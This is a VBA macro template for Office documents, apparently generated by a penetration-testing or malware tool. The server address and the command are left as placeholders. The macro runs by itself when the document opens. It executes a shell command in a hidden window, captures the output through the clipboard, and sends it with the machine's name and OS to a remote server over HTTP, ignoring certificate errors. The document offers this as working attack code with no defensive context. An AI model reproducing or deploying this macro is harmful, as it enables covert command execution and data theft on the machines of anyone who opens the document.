
Dim serverUrl As String

' Auto generate at startup
Sub Workbook_Open()
    Main
End Sub
Sub AutoOpen()
    Main
End Sub

Private Sub Main()
    Dim msg As String
    serverUrl = "<<<TEMPLATE>>>"
   	msg = "<<<TEMPLATE>>>"
   	On Error GoTo byebye
    msg = PlayCmd(msg)
    SendResponse msg
    On Error GoTo 0
    byebye:
End Sub

'Sen data using http post'
'Note:
'WinHttpRequestOption_SslErrorIgnoreFlags, // 4
' See https://msdn.microsoft.com/en-us/library/windows/desktop/aa384108(v=vs.85).aspx'
Private Function HttpPostData(URL As String, data As String) 'data must have form "var1=value1&var2=value2&var3=value3"'
    Dim objHTTP As Object
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Option(4) = 13056  ' Ignore cert errors because self signed cert
    objHTTP.Open "POST", URL, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
    objHTTP.SetTimeouts 2000, 2000, 2000, 2000
    objHTTP.send (data)
    HttpPostData = objHTTP.responseText
End Function

' Returns target ID'
Private Function GetId() As String
    Dim myInfo As String
    Dim myID As String
    myID = Environ("COMPUTERNAME") & " " & Environ("OS") 
    GetId = myID
End Function

'To send response for command'
Private Function SendResponse(cmdOutput)
    Dim data As String
    Dim response As String
    data = "id=" & GetId & "&cmdOutput=" & cmdOutput
    SendResponse = HttpPostData(serverUrl, data)
End Function

' Play and return output any command line
Private Function PlayCmd(sCmd As String) As String
    'Run a shell command, returning the output as a string'
    ' Using a hidden window, pipe the output of the command to the CLIP.EXE utility...
    ' Necessary because normal usage with oShell.Exec("cmd.exe /C " & sCmd) always pops a windows
    Dim instruction As String
    instruction = "cmd.exe /c " & sCmd & " | clip"
    CreateObject("WScript.Shell").Run instruction, 0, True
    ' Read the clipboard text using htmlfile object
    PlayCmd = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
End Function

